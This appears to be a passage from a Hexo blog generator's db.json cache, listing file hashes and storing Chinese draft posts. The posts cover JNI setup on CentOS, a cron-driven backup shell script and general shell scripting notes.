"_id":"source/.git/objects/81/b8c59a37b3e5976b235c4181fa09bb0af7c7c7","hash":"dad563647b17afdb7b9d9deaee5aaf4f1ae46bbb","modified":1582635265731},{"_id":"source/.git/objects/9d/96492064ea9308789d4344d74b28c53d9623c7","hash":"47ccba1d0b3ceda307a48fab40a05e9edfba2c04","modified":1582635143153},{"_id":"source/.git/objects/df/31f3cdec7282b400d563964104529d8fb8a68b","hash":"f56368ac1613fc423249056a7e3a055ee339bb39","modified":1582635265793},{"_id":"source/.git/objects/e5/d2b6045248aace6398d687dd97d976118f990e","hash":"b973e2603d6ac1e12b17cb70a5509a3fe6f03dd6","modified":1582635143119},{"_id":"source/.git/objects/ea/a3ebc669ceac26c61a520b2313763610f0dfc0","hash":"28bab166a5eaa45949800ab7e516530b5cee5ada","modified":1582635265753},{"_id":"source/_drafts/2020-03-15_innodb_struct.md","hash":"47e7a46bbcbeef25885e35a0e3579a90844e34c0","modified":1584375169738},{"_id":"source/static/MB20031501-1.png","hash":"9b59e055f6dd2c5f00cccfd150b97139fcc431c8","modified":1580362388431},{"_id":"source/static/MB20031501-2.png","hash":"4dbacea27da27df05bd4988c1be7fc347de79b5a","modified":1584107992211},{"_id":"source/static/MB20031501-4.png","hash":"229e3f585cf6e63ab26353ebfed7602c7670722a","modified":1584103371319},{"_id":"source/static/MB20031501-3.png","hash":"735b6e8bc20195d206e222d809b7a44eb8e07eeb","modified":1583904575609},{"_id":"source/static/MB20031501-5.png","hash":"5ecfa90017915260feb3e8c1d30a5c77f4c8b5be","modified":1584104943481},{"_id":"source/static/MB20031501-6.png","hash":"0d91f45b9ad5ee7fb5273cf1d69c93f032b8d3de","modified":1584374693076},{"_id":"source/_posts/2020-03-15_Innodb_Struct.md","hash":"47e7a46bbcbeef25885e35a0e3579a90844e34c0","modified":1584375459266},{"_id":"source/.git/objects/2a/6d43663037a55e6f2f70661a9619fc9b5adf86","hash":"25921605d33033c4bbe66b7ebff890bfeaf49f7a","modified":1584375487556},{"_id":"source/.git/objects/32/6101e262091ce4a78893c402b1610b9fcc5885","hash":"ccc332e89dce13a7f76f14c667ae63f3ebe01aae","modified":1582639823706},{"_id":"source/.git/objects/33/040091c822fc60aa1d43ead702401dc2ad3a73","hash":"7d80f13fcffbd1a8a31c66459909e20f540eb3ad","modified":1584375487512},{"_id":"source/.git/objects/31/2fd8b3b56f865c0256a313a0786d1ddbfba212","hash":"bed89c4ec009c259015c4bb1057b6ceb0adc73c2","modified":1582638766389},{"_id":"source/.git/objects/3f/72e1f6a6ed98afcd72fd927690e1d01515b5c1","hash":"17eac94127a8b03423985b8bba1abac3306f31ba","modified":1582638766327},{"_id":"source/.git/objects/76/0681b7dab24f4ba857d8f978f75084509b9a9f","hash":"72148a8eda34dc22d54ed8cfecd69a9fc7b98c44","modified":1584375487000},{"_id":"source/.git/objects/3e/466324dde25e02afe92ac878e1012026cd83de","hash":"fe35c059003679a5a50f49cb326e22d1bf4c93e7","modified":1582638766263},{"_id":"source/.git/objects/4d/9dab8a940bcdca3bfba7483a07944c089a4708","hash":"42fa67193067c1ddc8d276753655d4a930255bf0","modified":1582638766353},{"_id":"source/.git/objects/85/f2925292edcceb1143b6eade3329fb89575cd2","hash":"e1253b922edd92bda503c81e0d129f2e5ca8438b","modified":1584375487640},{"_id":"source/.git/objects/8e/7515f5d498134c3babb86f842a707fea0ca67a","hash":"c2acc78bcaf095bc88dddb762ba4b310192ccc06","modified":1584375504989},{"_id":"source/.git/objects/9e/b3940286b25992b9cd4bdd4d8f052cba79ca29","hash":"2a71b36e9e6767297729ce7f3fb2a93f3fe9545b","modified":1582639823636},{"_id":"source/.git/objects/9f/c89084e6a824f766ba5d9088c1c2ad781e5124","hash":"a7543f78dc6fad2bb7ccc61f30a5b0e278b67d2d","modified":1582639823601},{"_id":"source/.git/objects/a8/2825ca3e5727c6d522c082f3c8c9578fdd6b9b","hash":"cf42353391c6b2dd51d0bd8425513ba4b63e438d","modified":1584375504853},{"_id":"source/.git/objects/a8/62a10c073cd5414bc6e286042778320f563efe","hash":"eb958c41868eb7b3fb9221577416df1ba4b2b1a0","modified":1584375487581},{"_id":"source/.git/objects/a8/89c77c99f60041a6c8a11df4af07df0fea3620","hash":"ac3dbd1c374d5b9f6122720d4b03c9dd687296c2","modified":1584375504924},{"_id":"source/.git/objects/b0/9b5b5bf7c07395fd484df5864406d42a2d1d8a","hash":"b4ee88ea65db57fee197b3300fec1af408b14d88","modified":1584375505031},{"_id":"source/.git/objects/c0/1f05d9784a997a17c904f60fe31dd96b01e85d","hash":"56316a123557a3d22bf20f6cea63aa1b4710ccc7","modified":1584375505108},{"_id":"source/.git/objects/d2/2019c5f46b57bfc84dcd54af646d34d5755228","hash":"df101bf4d7759c7fecd348e2323d48128cbdff26","modified":1584375487601},{"_id":"source/.git/objects/73/eaf33758d1242cfc9bd783b0c21cf3e7d99ded","hash":"306164bb1781d06294597a1cfa9c958d923f158f","modified":1582639823545},{"_id":"public/2020/03/15/innodb-struct/index.html","hash":"a66c365b17c24101afc3c9465707b2be4dc75b3a","modified":1584375872079},{"_id":"public/2020/02/23/bipartite-graph/index.html","hash":"6767220b866353299ef29da47cebee53969b4dfe","modified":1584375872079},{"_id":"public/archives/2020/03/index.html","hash":"337d051da5589dac940dd3d922f64df58fc78702","modified":1584375872095},{"_id":"public/static/MB20031501-2.png","hash":"4dbacea27da27df05bd4988c1be7fc347de79b5a","modified":1584375872095},{"_id":"public/static/MB20031501-4.png","hash":"229e3f585cf6e63ab26353ebfed7602c7670722a","modified":1584375872095},{"_id":"public/static/MB20031501-3.png","hash":"735b6e8bc20195d206e222d809b7a44eb8e07eeb","modified":1584375872096},{"_id":"public/static/MB20031501-6.png","hash":"0d91f45b9ad5ee7fb5273cf1d69c93f032b8d3de","modified":1584375872096},{"_id":"public/static/MB20031501-5.png","hash":"5ecfa90017915260feb3e8c1d30a5c77f4c8b5be","modified":1584375872096},{"_id":"public/static/MB20031501-1.png","hash":"9b59e055f6dd2c5f00cccfd150b97139fcc431c8","modified":1584375872105}],"Category":[],"Data":[],"Page":[],"Post":[{"_content":"# 并发压测工具类CyclicBarrier\n\n","source":"_drafts/0000_Cyclic_Barrier.md","raw":"# 并发压测工具类CyclicBarrier\n\n","slug":"0000_Cyclic_Barrier","published":0,"date":"2020-01-23T08:27:34.204Z","updated":"2020-01-23T08:21:31.000Z","title":"","comments":1,"layout":"post","photos":[],"link":"","_id":"ck5qhi03c0000g0uk19l5gv4j","content":"<h1 id=\"并发压测工具类CyclicBarrier\"><a href=\"#并发压测工具类CyclicBarrier\" class=\"headerlink\" title=\"并发压测工具类CyclicBarrier\"></a>并发压测工具类CyclicBarrier</h1>","site":{"data":{}},"excerpt":"","more":"<h1 id=\"并发压测工具类CyclicBarrier\"><a href=\"#并发压测工具类CyclicBarrier\" class=\"headerlink\" title=\"并发压测工具类CyclicBarrier\"></a>并发压测工具类CyclicBarrier</h1>"},{"_content":"# 记录下linux上使用eclipse 进行Jni开发的个人经验\n\n这里使用的系统是 CentOS 7 \n\n\n1. CentOS 默认安装openjdk没安装开发环境，应安装开发环境 \n\nyum -y install java-1.7.0-openjdk-devel.x86_64\n\n \n\n2. Jni开发yum -y install gcc，如果没有自动安装g++，yum -y install gcc-c++\n\n\n\n3. eclipse 需要c/c++插件，具体可以下一个 eclipse-cpp-juno-SR2-win32-x86_64比对下具体加哪些组件\n\n\n\n4. Jni开发找到.h文件: whereis jvm找到/usr/lib/jvm目录，开发时用的到\n\n \n\n5. Jni开发eclipse配置run->extternal tools->external tools configurations..->program new->变量/usr/lib/jvm/java-.../bin/javah、${project_loc}、-v -classpath “${project_loc}/bin” -d“${project_loc}/jni” -jni ${java_type_name}\n\n \n\n6. Jni 开发 项目配置 properties->c/c++ build->\n\nSetting->Cross G++ Linker->Shared Library Settings->check Shared，\n\nIncludes中增加JAVA_HOME/include/linux和JAVA_HOME/include目录,Setting->Build Artifact 设置为ShareLibrary生成so文件前缀lib\n\n \n\n7. Jni开发 如出现 ....o:relocation R_X86_64_32 against  .rodataa.str1.8’ can not be used when making a shared object; recompile with -fPIC则配置properties->c/c++ build->Setting -> Cross G++ Compiler-> Miscellaneous  在Other flags原参数前面添加“-fPIC” 参数（不要引号）\n\n\n","source":"_drafts/2017-06-29_linux_jni.md","raw":"# 记录下linux上使用eclipse 进行Jni开发的个人经验\n\n这里使用的系统是 CentOS 7 \n\n\n1. CentOS 默认安装openjdk没安装开发环境，应安装开发环境 \n\nyum -y install java-1.7.0-openjdk-devel.x86_64\n\n \n\n2. Jni开发yum -y install gcc，如果没有自动安装g++，yum -y install gcc-c++\n\n\n\n3. eclipse 需要c/c++插件，具体可以下一个 eclipse-cpp-juno-SR2-win32-x86_64比对下具体加哪些组件\n\n\n\n4. Jni开发找到.h文件: whereis jvm找到/usr/lib/jvm目录，开发时用的到\n\n \n\n5. Jni开发eclipse配置run->extternal tools->external tools configurations..->program new->变量/usr/lib/jvm/java-.../bin/javah、${project_loc}、-v -classpath “${project_loc}/bin” -d“${project_loc}/jni” -jni ${java_type_name}\n\n \n\n6. Jni 开发 项目配置 properties->c/c++ build->\n\nSetting->Cross G++ Linker->Shared Library Settings->check Shared，\n\nIncludes中增加JAVA_HOME/include/linux和JAVA_HOME/include目录,Setting->Build Artifact 设置为ShareLibrary生成so文件前缀lib\n\n \n\n7. Jni开发 如出现 ....o:relocation R_X86_64_32 against  .rodataa.str1.8’ can not be used when making a shared object; recompile with -fPIC则配置properties->c/c++ build->Setting -> Cross G++ Compiler-> Miscellaneous  在Other flags原参数前面添加“-fPIC” 参数（不要引号）\n\n\n","slug":"2017-06-29_linux_jni","published":0,"date":"2020-01-23T08:27:34.095Z","updated":"2020-01-23T08:21:31.000Z","title":"","comments":1,"layout":"post","photos":[],"link":"","_id":"ck5qhi04t0001g0ukary8936o","content":"<h1 id=\"记录下linux上使用eclipse-进行Jni开发的个人经验\"><a href=\"#记录下linux上使用eclipse-进行Jni开发的个人经验\" class=\"headerlink\" title=\"记录下linux上使用eclipse 进行Jni开发的个人经验\"></a>记录下linux上使用eclipse 进行Jni开发的个人经验</h1><p>这里使用的系统是 CentOS 7 </p>\n<ol>\n<li>CentOS 默认安装openjdk没安装开发环境，应安装开发环境 </li>\n</ol>\n<p>yum -y install java-1.7.0-openjdk-devel.x86_64</p>\n<ol start=\"2\">\n<li>Jni开发yum -y install gcc，如果没有自动安装g++，yum -y install gcc-c++</li>\n</ol>\n<ol start=\"3\">\n<li>eclipse 需要c/c++插件，具体可以下一个 eclipse-cpp-juno-SR2-win32-x86_64比对下具体加哪些组件</li>\n</ol>\n<ol start=\"4\">\n<li>Jni开发找到.h文件: whereis jvm找到/usr/lib/jvm目录，开发时用的到</li>\n</ol>\n<ol start=\"5\">\n<li>Jni开发eclipse配置run-&gt;extternal tools-&gt;external tools configurations..-&gt;program new-&gt;变量/usr/lib/jvm/java-…/bin/javah、${project_loc}、-v -classpath “${project_loc}/bin” -d“${project_loc}/jni” -jni ${java_type_name}</li>\n</ol>\n<ol start=\"6\">\n<li>Jni 开发 项目配置 properties-&gt;c/c++ build-&gt;</li>\n</ol>\n<p>Setting-&gt;Cross G++ Linker-&gt;Shared Library Settings-&gt;check Shared，</p>\n<p>Includes中增加JAVA_HOME/include/linux和JAVA_HOME/include目录,Setting-&gt;Build Artifact 设置为ShareLibrary生成so文件前缀lib</p>\n<ol start=\"7\">\n<li>Jni开发 如出现 ….o:relocation R_X86_64_32 against  .rodataa.str1.8’ can not be used when making a shared object; recompile with -fPIC则配置properties-&gt;c/c++ build-&gt;Setting -&gt; Cross G++ Compiler-&gt; Miscellaneous  在Other flags原参数前面添加“-fPIC” 参数（不要引号）</li>\n</ol>\n","site":{"data":{}},"excerpt":"","more":"<h1 id=\"记录下linux上使用eclipse-进行Jni开发的个人经验\"><a href=\"#记录下linux上使用eclipse-进行Jni开发的个人经验\" class=\"headerlink\" title=\"记录下linux上使用eclipse 进行Jni开发的个人经验\"></a>记录下linux上使用eclipse 进行Jni开发的个人经验</h1><p>这里使用的系统是 CentOS 7 </p>\n<ol>\n<li>CentOS 默认安装openjdk没安装开发环境，应安装开发环境 </li>\n</ol>\n<p>yum -y install java-1.7.0-openjdk-devel.x86_64</p>\n<ol start=\"2\">\n<li>Jni开发yum -y install gcc，如果没有自动安装g++，yum -y install gcc-c++</li>\n</ol>\n<ol start=\"3\">\n<li>eclipse 需要c/c++插件，具体可以下一个 eclipse-cpp-juno-SR2-win32-x86_64比对下具体加哪些组件</li>\n</ol>\n<ol start=\"4\">\n<li>Jni开发找到.h文件: whereis jvm找到/usr/lib/jvm目录，开发时用的到</li>\n</ol>\n<ol start=\"5\">\n<li>Jni开发eclipse配置run-&gt;extternal tools-&gt;external tools configurations..-&gt;program new-&gt;变量/usr/lib/jvm/java-…/bin/javah、${project_loc}、-v -classpath “${project_loc}/bin” -d“${project_loc}/jni” -jni ${java_type_name}</li>\n</ol>\n<ol start=\"6\">\n<li>Jni 开发 项目配置 properties-&gt;c/c++ build-&gt;</li>\n</ol>\n<p>Setting-&gt;Cross G++ Linker-&gt;Shared Library Settings-&gt;check Shared，</p>\n<p>Includes中增加JAVA_HOME/include/linux和JAVA_HOME/include目录,Setting-&gt;Build Artifact 设置为ShareLibrary生成so文件前缀lib</p>\n<ol start=\"7\">\n<li>Jni开发 如出现 ….o:relocation R_X86_64_32 against  .rodataa.str1.8’ can not be used when making a shared object; recompile with -fPIC则配置properties-&gt;c/c++ build-&gt;Setting -&gt; Cross G++ Compiler-&gt; Miscellaneous  在Other flags原参数前面添加“-fPIC” 参数（不要引号）</li>\n</ol>\n"},{"_content":"# linux 定时备份文件\n\n## 文件备份脚本代码\n\n```shell\n#!/bin/bash\n\n# 备份源文件夹\ntargetFile=/home/vince/eclipse-workspace/\n# 备份目的地文件夹\nbackdir=/home/vince/backup/code\n\n\ndatetime=`date +\"%Y-%m-%d %H:%M:%S\"`\n# 保留两天内的备份文件\ndate2before=`date -d \"-2day\" +\"%Y-%m-%d %H:%M:%S\"`\n\nfor file_back in $backdir/*\ndo\n    filename=`basename \"$file_back\"`\n    if [[ $date2before > $filename ]]; then\n        echo \"rm\"\n        eval rm -rf \\'$file_back\\'\n    fi\ndone\n\nmkdir ${backdir}/\"${datetime}\"\n\ncd ${backdir}/\"${datetime}\"\n\nmkdir zx-plugin-zxtracker\n\ncp -rf ${targetFile} ./\n\necho 'backup done'\n设置定时任务\n1. sudo service cron start\n\n2. sudo crontab -e                # 接下来会让你选择一个文本编辑器，输入1-4对应所选编辑器\n\n3. 添加定时任务计划，输入： 0 10 * * * /home/vince/backup/backup.sh            # 命令对应：分 时 天 月 周 sh文件地址，周中0表示星期天    # 开机执行任务设置参数 @reboot /home/vince/backup/backup.sh\n\n4. sudo service cron restart            # 重启定时器生效\n\n```\n","source":"_drafts/2018-05-06_linux_schedule_back.md","raw":"# linux 定时备份文件\n\n## 文件备份脚本代码\n\n```shell\n#!/bin/bash\n\n# 备份源文件夹\ntargetFile=/home/vince/eclipse-workspace/\n# 备份目的地文件夹\nbackdir=/home/vince/backup/code\n\n\ndatetime=`date +\"%Y-%m-%d %H:%M:%S\"`\n# 保留两天内的备份文件\ndate2before=`date -d \"-2day\" +\"%Y-%m-%d %H:%M:%S\"`\n\nfor file_back in $backdir/*\ndo\n    filename=`basename \"$file_back\"`\n    if [[ $date2before > $filename ]]; then\n        echo \"rm\"\n        eval rm -rf \\'$file_back\\'\n    fi\ndone\n\nmkdir ${backdir}/\"${datetime}\"\n\ncd ${backdir}/\"${datetime}\"\n\nmkdir zx-plugin-zxtracker\n\ncp -rf ${targetFile} ./\n\necho 'backup done'\n设置定时任务\n1. sudo service cron start\n\n2. sudo crontab -e                # 接下来会让你选择一个文本编辑器，输入1-4对应所选编辑器\n\n3. 添加定时任务计划，输入： 0 10 * * * /home/vince/backup/backup.sh            # 命令对应：分 时 天 月 周 sh文件地址，周中0表示星期天    # 开机执行任务设置参数 @reboot /home/vince/backup/backup.sh\n\n4. sudo service cron restart            # 重启定时器生效\n\n```\n","slug":"2018-05-06_linux_schedule_back","published":0,"date":"2020-01-23T08:27:33.985Z","updated":"2020-01-23T08:21:31.000Z","title":"","comments":1,"layout":"post","photos":[],"link":"","_id":"ck5qhi04v0002g0ukuqybjnbs","content":"<h1 id=\"linux-定时备份文件\"><a href=\"#linux-定时备份文件\" class=\"headerlink\" title=\"linux 定时备份文件\"></a>linux 定时备份文件</h1><h2 id=\"文件备份脚本代码\"><a href=\"#文件备份脚本代码\" class=\"headerlink\" title=\"文件备份脚本代码\"></a>文件备份脚本代码</h2><figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#</span>!/bin/bash</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">#</span> 备份源文件夹</span><br><span class=\"line\">targetFile=/home/vince/eclipse-workspace/</span><br><span class=\"line\"><span class=\"meta\">#</span> 备份目的地文件夹</span><br><span class=\"line\">backdir=/home/vince/backup/code</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">datetime=`date +\"%Y-%m-%d %H:%M:%S\"`</span><br><span class=\"line\"><span class=\"meta\">#</span> 保留两天内的备份文件</span><br><span class=\"line\">date2before=`date -d \"-2day\" +\"%Y-%m-%d %H:%M:%S\"`</span><br><span class=\"line\"></span><br><span class=\"line\">for file_back in $backdir/*</span><br><span class=\"line\">do</span><br><span class=\"line\">    filename=`basename \"$file_back\"`</span><br><span class=\"line\">    if [[ $date2before &gt; $filename ]]; then</span><br><span class=\"line\">        echo \"rm\"</span><br><span class=\"line\">        eval rm -rf \\'$file_back\\'</span><br><span class=\"line\">    fi</span><br><span class=\"line\">done</span><br><span class=\"line\"></span><br><span class=\"line\">mkdir $&#123;backdir&#125;/\"$&#123;datetime&#125;\"</span><br><span class=\"line\"></span><br><span class=\"line\">cd $&#123;backdir&#125;/\"$&#123;datetime&#125;\"</span><br><span class=\"line\"></span><br><span class=\"line\">mkdir zx-plugin-zxtracker</span><br><span class=\"line\"></span><br><span class=\"line\">cp -rf $&#123;targetFile&#125; ./</span><br><span class=\"line\"></span><br><span class=\"line\">echo 'backup done'</span><br><span class=\"line\">设置定时任务</span><br><span class=\"line\">1. sudo service cron start</span><br><span class=\"line\"></span><br><span class=\"line\">2. sudo crontab -e                # 接下来会让你选择一个文本编辑器，输入1-4对应所选编辑器</span><br><span class=\"line\"></span><br><span class=\"line\">3. 添加定时任务计划，输入： 0 10 * * * /home/vince/backup/backup.sh            # 命令对应：分 时 天 月 周 sh文件地址，周中0表示星期天    # 开机执行任务设置参数 @reboot /home/vince/backup/backup.sh</span><br><span class=\"line\"></span><br><span class=\"line\">4. sudo service cron restart            # 重启定时器生效</span><br></pre></td></tr></table></figure>\n\n","site":{"data":{}},"excerpt":"","more":"<h1 id=\"linux-定时备份文件\"><a href=\"#linux-定时备份文件\" class=\"headerlink\" title=\"linux 定时备份文件\"></a>linux 定时备份文件</h1><h2 id=\"文件备份脚本代码\"><a href=\"#文件备份脚本代码\" class=\"headerlink\" title=\"文件备份脚本代码\"></a>文件备份脚本代码</h2><figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#</span>!/bin/bash</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">#</span> 备份源文件夹</span><br><span class=\"line\">targetFile=/home/vince/eclipse-workspace/</span><br><span class=\"line\"><span class=\"meta\">#</span> 备份目的地文件夹</span><br><span class=\"line\">backdir=/home/vince/backup/code</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">datetime=`date +\"%Y-%m-%d %H:%M:%S\"`</span><br><span class=\"line\"><span class=\"meta\">#</span> 保留两天内的备份文件</span><br><span class=\"line\">date2before=`date -d \"-2day\" +\"%Y-%m-%d %H:%M:%S\"`</span><br><span class=\"line\"></span><br><span class=\"line\">for file_back in $backdir/*</span><br><span class=\"line\">do</span><br><span class=\"line\">    filename=`basename \"$file_back\"`</span><br><span class=\"line\">    if [[ $date2before &gt; $filename ]]; then</span><br><span class=\"line\">        echo \"rm\"</span><br><span class=\"line\">        eval rm -rf \\'$file_back\\'</span><br><span class=\"line\">    fi</span><br><span class=\"line\">done</span><br><span class=\"line\"></span><br><span class=\"line\">mkdir $&#123;backdir&#125;/\"$&#123;datetime&#125;\"</span><br><span class=\"line\"></span><br><span class=\"line\">cd $&#123;backdir&#125;/\"$&#123;datetime&#125;\"</span><br><span class=\"line\"></span><br><span class=\"line\">mkdir zx-plugin-zxtracker</span><br><span class=\"line\"></span><br><span class=\"line\">cp -rf $&#123;targetFile&#125; ./</span><br><span class=\"line\"></span><br><span class=\"line\">echo 'backup done'</span><br><span class=\"line\">设置定时任务</span><br><span class=\"line\">1. sudo service cron start</span><br><span class=\"line\"></span><br><span class=\"line\">2. sudo crontab -e                # 接下来会让你选择一个文本编辑器，输入1-4对应所选编辑器</span><br><span class=\"line\"></span><br><span class=\"line\">3. 添加定时任务计划，输入： 0 10 * * * /home/vince/backup/backup.sh            # 命令对应：分 时 天 月 周 sh文件地址，周中0表示星期天    # 开机执行任务设置参数 @reboot /home/vince/backup/backup.sh</span><br><span class=\"line\"></span><br><span class=\"line\">4. sudo service cron restart            # 重启定时器生效</span><br></pre></td></tr></table></figure>\n\n"},{"_content":"# SHELL笔记\n\n## 开机执行\n\n1. `vim /etc/rc.local`  \n2. `cd /etc/profile.d ` \n3. `vim ~/.bashrc` 仅适用登录用户，非管理员权限 \n4. `sudo service cron start` + `sudo crontab -e` + `sudo service cron restart`  \n\n\n\n## IF条件\n\n单中括号 `[3 -gt 2]` 是可执行程序等价于`test 3 -gt 2`  ，处理带空格的字符串的时候会有问题，需使用双括号包裹 `d1='2018-01-02 12:11:00' && d2='2018-02-02 12:11:11' && if [ \"$d1\" \\< \"$d2\" ] ; then echo 1; else echo 2; fi;`\n\n双中括号`d1='2018-01-02 12:11:00' && d2='2018-02-02 12:11:11' && if [[ $d1 > $d2 ]]; then echo 1; else echo 2; fi;` 处理带空格字符串不会有问题 \n\n`-gt` `-lt`数值比较大小 \n\n`<` `>` 字符串比较大小，在[ ]中需使用`\\< ` `\\>` 才能正确，否则会被当作重定向 \n\n\n\n## 静默安装\n\n1. `debconf-show` 查看可预置项，如：`sudo debconf-show oracle-java8-installer` 得到如下信息\n\n   ```\n    shared/error-oracle-license-v1-1:\n     oracle-java8-installer/not_exist:\n   * shared/accepted-oracle-license-v1-1: true\n   * shared/present-oracle-license-v1-1:\n     oracle-java8-installer/local:\n   ```\n\n2. 脚本方式安装时使用预置项，例中为接受证书\n\n   ```\n   # 设置预置值\n   echo oracle-java8-installer shared/accepted-oracle-license-v1-1 select true | debconf-set-selections\n   # 执行安装的过程中会使用该默认值\n   apt-get install -y oracle-java8-installer\n   ```\n\n\n## 指令\n\n`nohup` 不挂断运行 \n\n末尾的`&` 后台运行（有些程序需要与`nohup`结合使用） \n\n`2>&1`      2表示错误输出，1表示标准输出，将错误输出重定向到标准输出 \n\n`awk '{print NR}'`  打印行数 \n\n`awk -F \" \" '{print $1}'`   打印第1列（下标1开始，$0表示完整一行数据），-F指定分割符 \n\n`echo -a $lbs_release` 查看系统完整版本信息 \n\n`eval $cmd` cmd字符串作为命令执行 \n\n","source":"_drafts/2019-01-15_shell.md","raw":"# SHELL笔记\n\n## 开机执行\n\n1. `vim /etc/rc.local`  \n2. `cd /etc/profile.d ` \n3. `vim ~/.bashrc` 仅适用登录用户，非管理员权限 \n4. `sudo service cron start` + `sudo crontab -e` + `sudo service cron restart`  \n\n\n\n## IF条件\n\n单中括号 `[3 -gt 2]` 是可执行程序等价于`test 3 -gt 2`  ，处理带空格的字符串的时候会有问题，需使用双括号包裹 `d1='2018-01-02 12:11:00' && d2='2018-02-02 12:11:11' && if [ \"$d1\" \\< \"$d2\" ] ; then echo 1; else echo 2; fi;`\n\n双中括号`d1='2018-01-02 12:11:00' && d2='2018-02-02 12:11:11' && if [[ $d1 > $d2 ]]; then echo 1; else echo 2; fi;` 处理带空格字符串不会有问题 \n\n`-gt` `-lt`数值比较大小 \n\n`<` `>` 字符串比较大小，在[ ]中需使用`\\< ` `\\>` 才能正确，否则会被当作重定向 \n\n\n\n## 静默安装\n\n1. `debconf-show` 查看可预置项，如：`sudo debconf-show oracle-java8-installer` 得到如下信息\n\n   ```\n    shared/error-oracle-license-v1-1:\n     oracle-java8-installer/not_exist:\n   * shared/accepted-oracle-license-v1-1: true\n   * shared/present-oracle-license-v1-1:\n     oracle-java8-installer/local:\n   ```\n\n2. 脚本方式安装时使用预置项，例中为接受证书\n\n   ```\n   # 设置预置值\n   echo oracle-java8-installer shared/accepted-oracle-license-v1-1 select true | debconf-set-selections\n   # 执行安装的过程中会使用该默认值\n   apt-get install -y oracle-java8-installer\n   ```\n\n\n## 指令\n\n`nohup` 不挂断运行 \n\n末尾的`&` 后台运行（有些程序需要与`nohup`结合使用） \n\n`2>&1`      2表示错误输出，1表示标准输出，将错误输出重定向到标准输出 \n\n`awk '{print NR}'`  打印行数 \n\n`awk -F \" \" '{print $1}'`   打印第1列（下标1开始，$0表示完整一行数据），-F指定分割符 \n\n`echo -a $lbs_release` 查看系统完整版本信息 \n\n`eval $cmd` cmd字符串作为命令执行 \n\n","slug":"2019-01-15_shell","published":0,"date":"2020-01-23T08:27:34.142Z","updated":"2020-01-23T08:21:31.000Z","title":"","comments":1,"layout":"post","photos":[],"link":"","_id":"ck5qhi04y0003g0uktw4493x0","content":"<h1 id=\"SHELL笔记\"><a href=\"#SHELL笔记\" class=\"headerlink\" title=\"SHELL笔记\"></a>SHELL笔记</h1><h2 id=\"开机执行\"><a href=\"#开机执行\" class=\"headerlink\" title=\"开机执行\"></a>开机执行</h2><ol>\n<li><code>vim /etc/rc.local</code>  </li>\n<li><code>cd /etc/profile.d</code> </li>\n<li><code>vim ~/.bashrc</code> 仅适用登录用户，非管理员权限 </li>\n<li><code>sudo service cron start</code> + <code>sudo crontab -e</code> + <code>sudo service cron restart</code>  </li>\n</ol>\n<h2 id=\"IF条件\"><a href=\"#IF条件\" class=\"headerlink\" title=\"IF条件\"></a>IF条件</h2><p>单中括号 <code>[3 -gt 2]</code> 是可执行程序等价于<code>test 3 -gt 2</code>  ，处理带空格的字符串的时候会有问题，需使用双括号包裹 <code>d1=&#39;2018-01-02 12:11:00&#39; &amp;&amp; d2=&#39;2018-02-02 12:11:11&#39; &amp;&amp; if [ &quot;$d1&quot; \\&lt; &quot;$d2&quot; ] ; then echo 1; else echo 2; fi;</code></p>\n<p>双中括号<code>d1=&#39;2018-01-02 12:11:00&#39; &amp;&amp; d2=&#39;2018-02-02 12:11:11&#39; &amp;&amp; if [[ $d1 &gt; $d2 ]]; then echo 1; else echo 2; fi;</code> 处理带空格字符串不会有问题 </p>\n<p><code>-gt</code> <code>-lt</code>数值比较大小 </p>\n<p><code>&lt;</code> <code>&gt;</code> 字符串比较大小，在[ ]中需使用<code>\\&lt;</code> <code>\\&gt;</code> 才能正确，否则会被当作重定向 </p>\n<h2 id=\"静默安装\"><a href=\"#静默安装\" class=\"headerlink\" title=\"静默安装\"></a>静默安装</h2><ol>\n<li><p><code>debconf-show</code> 查看可预置项，如：<code>sudo debconf-show oracle-java8-installer</code> 得到如下信息</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span 